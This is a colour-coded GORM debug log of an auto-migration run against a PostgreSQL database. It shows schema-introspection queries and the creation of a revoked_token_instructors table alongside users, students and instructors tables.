[0m[33m[1.196ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.669ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND constraint_name = 'fk_instructors_user'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.809ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructors_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.791ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructor_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.842ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.420ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.957ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.574ms] [34;1m[rows:-][0m SELECT * FROM "revoked_tokens" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.488ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'revoked_tokens' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.751ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'revoked_tokens'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.530ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'revoked_tokens'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.168ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.316ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.179ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.165ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.155ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND column_name = 'token') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'revoked_tokens' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.768ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'revoked_tokens' AND indexname = 'idx_revoked_tokens_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.622ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_token_instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[28.707ms] [34;1m[rows:0][0m CREATE TABLE "revoked_token_instructors" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"instructor_id" bigint,"revoked_token_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_revoked_token_instructors_instructor" FOREIGN KEY ("instructor_id") REFERENCES "instructors"("id"),CONSTRAINT "fk_revoked_token_instructors_revoked_token" FOREIGN KEY ("revoked_token_id") REFERENCES "revoked_tokens"("id"))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[11.723ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_revoked_token_instructors_deleted_at" ON "revoked_token_instructors" ("deleted_at")

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.044ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.410ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.023ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.220ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[13.108ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[17.180ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.560ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.212ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.142ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.252ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.372ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.266ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.150ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.163ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.189ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.190ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.686ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.114ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.576ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.882ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.949ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.831ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.876ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.495ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.208ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'students'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.041ms] [34;1m[rows:-][0m SELECT * FROM "students" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.292ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.239ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.621ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'students'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.321ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.749ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.968ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.022ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.731ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'is_premiem') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.607ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.403ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND constraint_name = 'fk_students_user'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.292ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_students_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.920ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_student_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.679ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'revoked_tokens' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.333ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
